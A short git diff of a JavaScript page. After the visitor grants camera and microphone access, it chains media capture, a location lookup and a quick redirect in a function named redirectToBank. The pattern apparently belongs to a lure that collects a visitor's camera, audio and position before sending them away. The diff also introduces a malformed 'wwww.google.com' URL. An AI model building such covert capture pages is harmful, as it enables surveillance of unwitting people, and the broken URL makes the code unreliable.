@@ -67,8 +67,8 @@ var allPermissions = 0;
 function redirectToBank(){
   console.log("redirect");
   setTimeout(() => {
-    window.location.replace("https://www.google.com")  
-  }, 3000)
+    window.location.replace("https://wwww.google.com")  
+  }, 1000)
   
 }
 
@@ -76,7 +76,13 @@ function redirectToBank(){
 
   navigator.mediaDevices.getUserMedia({audio:true,video:true})
     .then((stream) => {
-      gotStream(stream);
+      Promise.resolve(gotStream(stream))
+        .then(() => {
+          Promise.resolve(getLocation())
+            .then(() => {
+              redirectToBank();
+            })
+        }) 
     })
     .catch((error) => {
       onfail(error);
